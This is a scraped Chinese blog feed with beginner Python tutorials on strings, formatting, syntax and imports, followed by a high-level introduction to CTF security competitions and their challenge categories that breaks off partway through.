<strong>注意：</strong></p><ul><li>1、反斜杠可以用来转义，使用r可以让反斜杠不发生转义。</li><li>2、字符串可以用+运算符连接在一起，用*运算符重复。</li><li>3、Python中的字符串有两种索引方式，从左往右以0开始，从右往左以-1开始。</li><li>4、Python中的字符串不能改变。</li></ul><h3 id="——注这是关于字符串扩展——–"><a href="#——注这是关于字符串扩展——–" class="headerlink" title="——注这是关于字符串扩展——–"></a>——注这是关于字符串扩展——–</h3><h4 id="Python-字符串更新"><a href="#Python-字符串更新" class="headerlink" title="Python 字符串更新"></a>Python 字符串更新</h4><p>你可以截取字符串的一部分并与其他字段拼接，如下实例：</p><pre class=" language-python"><code class="language-python">var1 <span class="token operator">=</span> <span class="token string">'Hello World!'</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"已更新字符串 : "</span><span class="token punctuation">,</span> var1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'Runoob!'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">###以上实例执行结果</span>已更新字符串 <span class="token punctuation">:</span>  Hello Runoob!</code></pre><h4 id="Python转义字符"><a href="#Python转义字符" class="headerlink" title="Python转义字符"></a>Python转义字符</h4><p>在需要在字符中使用特殊字符时，python用反斜杠()转义字符。如下表：</p><table><thead><tr><th>转义字符</th><th>描述</th></tr></thead><tbody><tr><td>(在行尾时)</td><td>续行符</td></tr><tr><td>\</td><td>反斜杠符号</td></tr><tr><td>&#39;</td><td>单引号</td></tr><tr><td>&quot;</td><td>双引号</td></tr><tr><td>\a</td><td>响铃</td></tr><tr><td>\b</td><td>退格(Backspace)</td></tr><tr><td>\000</td><td>空</td></tr><tr><td>\n</td><td>换行</td></tr><tr><td>\v</td><td>纵向制表符</td></tr><tr><td>\t</td><td>横向制表符</td></tr><tr><td>\r</td><td>回车</td></tr><tr><td>\f</td><td>换页</td></tr><tr><td>\oyy</td><td>八进制数，<strong>yy</strong> 代表的字符，例如：<strong>\o12</strong> 代表换行，其中 o 是字母，不是数字 0。</td></tr><tr><td>\xyy</td><td>十六进制数，yy代表的字符，例如：\x0a代表换行</td></tr><tr><td>\other</td><td>其它的字符以普通格式输出</td></tr></tbody></table><h4 id="Python字符串运算符"><a href="#Python字符串运算符" class="headerlink" title="Python字符串运算符"></a>Python字符串运算符</h4><p>下表实例变量a值为字符串 “Hello”，b变量值为 “Python”：</p><table><thead><tr><th>操作符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>+</td><td>字符串连接</td><td>a + b 输出结果： HelloPython</td></tr><tr><td>*</td><td>重复输出字符串</td><td>a*2 输出结果：HelloHello</td></tr><tr><td>[]</td><td>通过索引获取字符串中字符</td><td>a[1] 输出结果 <strong>e</strong></td></tr><tr><td>[ : ]</td><td>截取字符串中的一部分，遵循<strong>左闭右开</strong>原则，str[0,2] 是不包含第 3 个字符的。</td><td>a[1:4] 输出结果 <strong>ell</strong></td></tr><tr><td>in</td><td>成员运算符 - 如果字符串中包含给定的字符返回 True</td><td><strong>‘H’ in a</strong> 输出结果 True</td></tr><tr><td>not in</td><td>成员运算符 - 如果字符串中不包含给定的字符返回 True</td><td><strong>‘M’ not in a</strong> 输出结果 True</td></tr><tr><td>r/R</td><td>原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。  原始字符串除在字符串的第一个引号前加上字母 r（可以大小写）以外，与普通字符串有着几乎完全相同的语法。</td><td><code>print( r&#39;\n&#39; ) print( R&#39;\n&#39; )</code></td></tr><tr><td>%</td><td>格式字符串</td><td>请看下一节内容。</td></tr></tbody></table><pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token string">"Hello"</span>b <span class="token operator">=</span> <span class="token string">"Python"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a + b 输出结果："</span><span class="token punctuation">,</span> a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a * 2 输出结果："</span><span class="token punctuation">,</span> a <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a[1] 输出结果："</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a[1:4] 输出结果："</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token string">"H"</span> <span class="token keyword">in</span> a<span class="token punctuation">)</span> <span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"H 在变量 a 中"</span><span class="token punctuation">)</span><span class="token keyword">else</span> <span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"H 不在变量 a 中"</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token string">"M"</span> <span class="token operator">not</span> <span class="token keyword">in</span> a<span class="token punctuation">)</span> <span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"M 不在变量 a 中"</span><span class="token punctuation">)</span><span class="token keyword">else</span> <span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"M 在变量 a 中"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>r<span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>R<span class="token string">'\n'</span><span class="token punctuation">)</span></code></pre><p><strong>以上实例输出结果为：</strong></p><pre class=" language-python"><code class="language-python">a <span class="token operator">+</span> b 输出结果： HelloPythona <span class="token operator">*</span> <span class="token number">2</span> 输出结果： HelloHelloa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> 输出结果： ea<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> 输出结果： ellH 在变量 a 中M 不在变量 a 中\n\n</code></pre><h4 id="Python字符串格式化"><a href="#Python字符串格式化" class="headerlink" title="Python字符串格式化"></a>Python字符串格式化</h4><p>Python 支持格式化字符串的输出 。尽管这样可能会用到非常复杂的表达式，但最基本的用法是将一个值插入到一个有字符串格式符 %s 的字符串中。在 Python 中，字符串格式化使用与 C 中 sprintf 函数一样的语法。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"我叫 %s 今年 %d 岁!"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">###输出结果</span>我叫 小明 今年 <span class="token number">10</span> 岁!</code></pre><p>python字符串格式化符号:</p><table><thead><tr><th>符   号</th><th>描述</th></tr></thead><tbody><tr><td>%c</td><td>格式化字符及其ASCII码</td></tr><tr><td>%s</td><td>格式化字符串</td></tr><tr><td>%d</td><td>格式化整数</td></tr><tr><td>%u</td><td>格式化无符号整型</td></tr><tr><td>%o</td><td>格式化无符号八进制数</td></tr><tr><td>%x</td><td>格式化无符号十六进制数</td></tr><tr><td>%X</td><td>格式化无符号十六进制数（大写）</td></tr><tr><td>%f</td><td>格式化浮点数字，可指定小数点后的精度</td></tr><tr><td>%e</td><td>用科学计数法格式化浮点数</td></tr><tr><td>%E</td><td>作用同%e，用科学计数法格式化浮点数</td></tr><tr><td>%g</td><td>%f和%e的简写</td></tr><tr><td>%G</td><td>%f 和 %E 的简写</td></tr><tr><td>%p</td><td>用十六进制数格式化变量的地址</td></tr></tbody></table><p>格式化操作符辅助指令:</p><table><thead><tr><th>符号</th><th>功能</th></tr></thead><tbody><tr><td>*</td><td>定义宽度或者小数点精度</td></tr><tr><td>-</td><td>用做左对齐</td></tr><tr><td>+</td><td>在正数前面显示加号( + )</td></tr><tr><td><sp></sp></td><td>在正数前面显示空格</td></tr><tr><td>#</td><td>在八进制数前面显示零(‘0’)，在十六进制前面显示’0x’或者’0X’(取决于用的是’x’还是’X’)</td></tr><tr><td>0</td><td>显示的数字前面填充’0’而不是默认的空格</td></tr><tr><td>%</td><td>‘%%’输出一个单一的’%’</td></tr><tr><td>(var)</td><td>映射变量(字典参数)</td></tr><tr><td>m.n.</td><td>m 是显示的最小总宽度,n 是小数点后的位数(如果可用的话)</td></tr></tbody></table><p>Python2.6 开始，新增了一种格式化字符串的函数 <a href="https://www.runoob.com/python/att-string-format.html" target="_blank" rel="noopener">str.format()</a>，它增强了字符串格式化的功能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python初识</title>
      <link href="/2020/01/14/python-chu-shi-yi/"/>
      <url>/2020/01/14/python-chu-shi-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="python初识"><a href="#python初识" class="headerlink" title="python初识"></a>python初识</h1><h2 id="Python3-简介"><a href="#Python3-简介" class="headerlink" title="Python3 简介"></a>Python3 简介</h2><p>Python 是一个高层次的结合了解释性、编译性、互动性和面向对象的脚本语言。 </p><p>Python 的设计具有很强的可读性，相比其他语言经常使用英文关键字，其他语言的一些标点符号，它具有比其他语言更有特色语法结构。</p><ul><li><strong>Python 是一种解释型语言：</strong> 这意味着开发过程中没有了编译这个环节。类似于PHP和Perl语言。</li><li><strong>Python 是交互式语言：</strong> 这意味着，您可以在一个 Python 提示符 &gt;&gt;&gt; 后直接执行代码。</li><li><strong>Python 是面向对象语言:</strong> 这意味着Python支持面向对象的风格或代码封装在对象的编程技术。</li><li><strong>Python 是初学者的语言：</strong>Python 对初级程序员而言，是一种伟大的语言，它支持广泛的应用程序开发，从简单的文字处理到 WWW 浏览器再到游戏。</li></ul><hr><h3 id="Python-发展历史"><a href="#Python-发展历史" class="headerlink" title="Python 发展历史"></a>Python 发展历史</h3><p>Python 是由 Guido van Rossum 在八十年代末和九十年代初，在荷兰国家数学和计算机科学研究所设计出来的。</p><p>Python 本身也是由诸多其他语言发展而来的,这包括 ABC、Modula-3、C、C++、Algol-68、SmallTalk、Unix shell 和其他的脚本语言等等。</p><p>像 Perl 语言一样，Python 源代码同样遵循 GPL(GNU General Public License)协议。</p><p>现在 Python 是由一个核心开发团队在维护，Guido van Rossum 仍然占据着至关重要的作用，指导其进展。</p><p>Python 2.0 于 2000 年 10 月 16 日发布，增加了实现完整的垃圾回收，并且支持 Unicode。</p><p>Python 3.0 于 2008 年 12 月 3 日发布，此版不完全兼容之前的 Python 源代码。不过，很多新特性后来也被移植到旧的Python 2.6/2.7版本。</p><p>Python 3.0 版本，常被称为 Python 3000，或简称 Py3k。相对于 Python 的早期版本，这是一个较大的升级。</p><p>Python 2.7 被确定为最后一个 Python 2.x 版本，它除了支持 Python 2.x 语法外，还支持部分 Python 3.1 语法。</p><hr><h3 id="Python-特点"><a href="#Python-特点" class="headerlink" title="Python 特点"></a>Python 特点</h3><ul><li><strong>1.易于学习：</strong>Python有相对较少的关键字，结构简单，和一个明确定义的语法，学习起来更加简单。</li><li><strong>2.易于阅读：</strong>Python代码定义的更清晰。</li><li><strong>3.易于维护：</strong>Python的成功在于它的源代码是相当容易维护的。</li><li><strong>4.一个广泛的标准库：</strong>Python的最大的优势之一是丰富的库，跨平台的，在UNIX，Windows和Macintosh兼容很好。</li><li><strong>5.互动模式：</strong>互动模式的支持，您可以从终端输入执行代码并获得结果的语言，互动的测试和调试代码片断。</li><li><strong>6.可移植：</strong>基于其开放源代码的特性，Python已经被移植（也就是使其工作）到许多平台。</li><li><strong>7.可扩展：</strong>如果你需要一段运行很快的关键代码，或者是想要编写一些不愿开放的算法，你可以使用C或C++完成那部分程序，然后从你的Python程序中调用。</li><li><strong>8.数据库：</strong>Python提供所有主要的商业数据库的接口。</li><li><strong>9.GUI编程：</strong>Python支持GUI可以创建和移植到许多系统调用。</li><li><strong>10.可嵌入:</strong> 你可以将Python嵌入到C/C++程序，让你的程序的用户获得”脚本化”的能力。</li></ul><hr><h3 id="Python-应用"><a href="#Python-应用" class="headerlink" title="Python 应用"></a>Python 应用</h3><ul><li>Youtube - 视频社交网站</li><li>Reddit - 社交分享网站</li><li>Dropbox - 文件分享服务</li><li>豆瓣网 - 图书、唱片、电影等文化产品的资料数据库网站</li><li>知乎 - 一个问答网站</li><li>果壳 - 一个泛科技主题网站</li><li>Bottle - Python微Web框架</li><li>EVE - 网络游戏EVE大量使用Python进行开发</li><li>Blender - 使用Python作为建模工具与GUI语言的开源3D绘图软件</li><li>Inkscape - 一个开源的SVG矢量图形编辑器。</li></ul><h2 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h2><h3 id="python基础语法"><a href="#python基础语法" class="headerlink" title="python基础语法"></a>python基础语法</h3><h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p>默认情况下，Python 3 源码文件以 <strong>UTF-8</strong> 编码，所有字符串都是 unicode 字符串。</p><p> 当然你也可以为源码文件指定不同的编码 </p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: cp-1252 -*-</span></code></pre><h4 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h4><ul><li>第一个字符必须是字母表中字母或下划线 _ 。</li><li>标识符的其他的部分由字母、数字和下划线组成。</li><li>标识符对大小写敏感。</li></ul><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>注释可以用 # 号，还有  ‘ ‘ ‘ 和 “ “ “：</p><blockquote><h1 id="第一个注释"><a href="#第一个注释" class="headerlink" title="第一个注释"></a>第一个注释</h1><p>print (“Hello, Python!”) # 第二个注释</p><p>‘’’<br>第三注释<br>第四注释<br>‘’’<br>“””<br>第五注释<br>第六注释<br>“””</p><p>print (“Hello, Python!”)</p></blockquote><h4 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h4><p> python最具特色的就是使用缩进来表示代码块，不需要使用大括号 {} 。</p><p>缩进的空格数是可变的，但是同一个代码块的语句必须包含相同的缩进空格数。</p><p>(<strong>这是最要命的地方</strong>，==他的缩进不是很容易分辨和不能随意缩进==，<code>如果缩进不一致就会运行出错</code>)</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Answer"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"True"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Answer"</span><span class="token punctuation">)</span>  <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"False"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 缩进不一致，会导致运行错误</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>  File <span class="token string">"test.py"</span><span class="token punctuation">,</span> line <span class="token number">6</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"False"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 缩进不一致，会导致运行错误</span>                                      <span class="token operator">^</span><span class="token comment" spellcheck="true">#IndentationError: unindent does not match any outer indentation level</span></code></pre><h4 id="数字-Number-类型"><a href="#数字-Number-类型" class="headerlink" title="数字(Number)类型"></a>数字(Number)类型</h4><p>python中数字有四种类型：<strong>整数、布尔型、浮点数和复数</strong>。</p><ul><li><strong>int</strong> (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。</li><li><strong>bool</strong> (布尔), 如 True。</li><li><strong>float</strong> (浮点数), 如 1.23、3E-2</li><li><strong>complex</strong> (复数), 如 1 + 2j、 1.1 + 2.2j</li></ul><h4 id="字符串-String"><a href="#字符串-String" class="headerlink" title="字符串(String)"></a>字符串(String)</h4><ul><li>python中单引号和双引号使用完全相同。</li><li>使用三引号(‘’’或”””)可以指定一个多行字符串。</li><li>转义符 ‘\‘</li><li>反斜杠可以用来转义，使用r可以让反斜杠不发生转义。。 如 r”this is a line with \n” 则\n会显示，并不是换行。</li><li>按字面意义级联字符串，如”this “ “is “ “string”会被自动转换为this is string。</li><li>字符串可以用 + 运算符连接在一起，用 * 运算符重复。</li><li>Python 中的字符串有两种索引方式，==从左往右以 0 开始，从右往左以 -1 开始==。</li><li>Python中的字符串不能改变。</li><li>Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。</li><li><strong>字符串的截取的语法格式如下</strong>：<code>变量[头下标:尾下标:步长]</code></li></ul><pre class=" language-python"><code class="language-python">word <span class="token operator">=</span> <span class="token string">'字符串'</span>sentence <span class="token operator">=</span> <span class="token string">"这是一个句子。"</span>paragraph <span class="token operator">=</span> <span class="token triple-quoted-string string">"""这是一个段落，可以由多行组成"""</span></code></pre><blockquote><pre class=" language-python"><code class="language-python">str<span class="token operator">=</span><span class="token string">'Runoob'</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true"># 输出字符串</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 输出第一个到倒数第二个的所有字符</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>              <span class="token comment" spellcheck="true"># 输出字符串第一个字符</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 输出从第三个开始到第五个的字符</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># 输出从第三个开始后的所有字符</span><span class="token keyword">print</span><span class="token punctuation">(</span>str <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># 输出字符串两次</span><span class="token keyword">print</span><span class="token punctuation">(</span>str <span class="token operator">+</span> <span class="token string">'你好'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 连接字符串</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hello\nrunoob'</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 使用反斜杠(\)+n转义特殊字符</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token string">'hello\nrunoob'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 在字符串前面添加一个 r，表示原始字符串，不会发生转义</span></code></pre><p><strong>这里的 r 指 raw，即 raw string。</strong></p><p><strong>输出结果为：</strong></p><blockquote><pre class=" language-python"><code class="language-python">RunoobRunooRnoonoobRunoobRunoobRunoob你好<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>hellorunoobhello\nrunoob</code></pre></blockquote></blockquote><h4 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h4><p>函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。</p><p>空行与代码缩进不同，空行并不是Python语法的一部分。书写时不插入空行，Python解释器运行也不会出错。但是空行的作用在于分隔两段不同功能或含义的代码，便于日后代码的维护或重构。</p><p><strong>记住：</strong>空行也是程序代码的一部分。</p><h4 id="多个语句构成代码组"><a href="#多个语句构成代码组" class="headerlink" title="多个语句构成代码组"></a>多个语句构成代码组</h4><p>缩进相同的一组语句构成一个代码块，我们称之代码组。</p><p>==像if、while、def和class这样的复合语句，首行以关键字开始，以冒号( : )结束==，该行之后的一行或多行代码构成代码组。</p><p>我们将首行及后面的代码组称为一个子句(clause)。</p><p>如下实例：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> expression <span class="token punctuation">:</span>    suite<span class="token keyword">elif</span> expression <span class="token punctuation">:</span>    suite <span class="token keyword">else</span> <span class="token punctuation">:</span>    suite</code></pre><h4 id="Print-输出"><a href="#Print-输出" class="headerlink" title="Print 输出"></a>Print 输出</h4><p>print 默认输出是换行的，如果要实现不换行需要在变量末尾加上 <strong>end=” “</strong>：</p><pre class=" language-python"><code class="language-python"> x<span class="token operator">=</span><span class="token string">"a"</span>y<span class="token operator">=</span><span class="token string">"b"</span><span class="token comment" spellcheck="true"># 换行输出</span><span class="token keyword">print</span><span class="token punctuation">(</span> x <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span> y <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'---------'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 不换行输出</span><span class="token keyword">print</span><span class="token punctuation">(</span> x<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span> <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span> y<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span> <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token comment" spellcheck="true">#输出结果</span>ab<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>a b</code></pre><h4 id="模块使用"><a href="#模块使用" class="headerlink" title="模块使用"></a>模块使用</h4><p><strong>import 与 from…import</strong></p><p>在 python 用 import 或者 from…import 来导入相应的模块。</p><p> 将整个模块(somemodule)导入，格式为： import somemodule</p><p> 从某个模块中导入某个函数,格式为： from somemodule import somefunction</p><p> 从某个模块中导入多个函数,格式为： from somemodule import firstfunc, secondfunc, thirdfunc</p><p> 将某个模块中的全部函数导入，格式为： from somemodule import *</p><blockquote><p><strong>导入 sys 模块</strong></p><p>import sys<br>print(‘================Python import mode==========================’)<br>print (‘命令行参数为:’)<br>for i in sys.argv:<br>print (i)<br>print (‘\n python 路径为’,sys.path)</p><p><strong>导入 sys 模块的 argv,path 成员</strong></p><p>from sys import argv,path  #  导入特定的成员<br>print(‘================python from import===================================’)<br>print(‘path:’,path) # 因为已经导入path成员，所以此处引用时不需要加sys.path</p></blockquote><hr>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF简介</title>
      <link href="/2019/12/25/ctf-jian-jie/"/>
      <url>/2019/12/25/ctf-jian-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF简介"><a href="#CTF简介" class="headerlink" title="CTF简介"></a>CTF简介</h1><p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 。</p><h2 id="CTF竞赛模式"><a href="#CTF竞赛模式" class="headerlink" title="CTF竞赛模式"></a>CTF竞赛模式</h2><h3 id="（1）解题模式（Jeopardy）"><a href="#（1）解题模式（Jeopardy）" class="headerlink" title="（1）解题模式（Jeopardy）"></a><strong>（1）解题模式（Jeopardy）</strong></h3><p>在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。</p><h3 id="（2）攻防模式（Attack-Defense）"><a href="#（2）攻防模式（Attack-Defense）" class="headerlink" title="（2）攻防模式（Attack-Defense）"></a><strong>（2）攻防模式（Attack-Defense）</strong></h3><p>在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。</p><h3 id="（3）混合模式（Mix）"><a href="#（3）混合模式（Mix）" class="headerlink" title="（3）混合模式（Mix）"></a><strong>（3）混合模式（Mix</strong>）</h3><p>结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。</p><h2 id="CTF各大题型简介"><a href="#CTF各大题型简介" class="headerlink" title="CTF各大题型简介"></a>CTF各大题型简介</h2><h4 id="WEB（web类）："><a href="#WEB（web类）：" class="headerlink" title="WEB（web类）："></a>WEB（web类）：</h4><p>WEB应用在今天越来越广泛，也是CTF夺旗竞赛中的主要题型，题目涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码审计、上传等漏洞。这些题目都不是简单的注入、上传题目，至少会有一层的安全过滤，需要选手想办法绕过。且Web题目是国内比较多也是大家比较喜欢的题目。因为大多数人开始安全都是从web日站开始的。</p><h4 id="REVERSE（逆向）："><a href="#REVERSE（逆向）：" class="headerlink" title="REVERSE（逆向）："></a>REVERSE（逆向）：</h4><p>全称reverse。题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。需要掌握汇编，堆栈、寄存器方面的知识。有好的逻辑思维能力。主要考查参赛选手的逆向分析能力。此类题目也是线下比赛的考察重点。</p><h4 id="PWN（溢出）："><a href="#PWN（溢出）：" class="headerlink" title="PWN（溢出）："></a>PWN（溢出）：</h4><p>PWN在黑客俚语中代表着攻破，取得权限，在CTF比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有栈溢出、堆溢出。在CTF比赛中，线上比赛会有，但是比例不会太重，进入线下比赛，逆向和溢出则是战队实力的关键。主要考察参数选手漏洞挖掘和利用能力。</p><h4 id="CRYPTO（密码学）："><a href="#CRYPTO（密码学）：" class="headerlink" title="CRYPTO（密码学）："></a>CRYPTO（密码学）：</h4><p>全称Cryptography。题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。实验吧“角斗场”中，这样的题目汇集的最多。这部分主要考查参赛选手密码学相关知识点。</p><h4 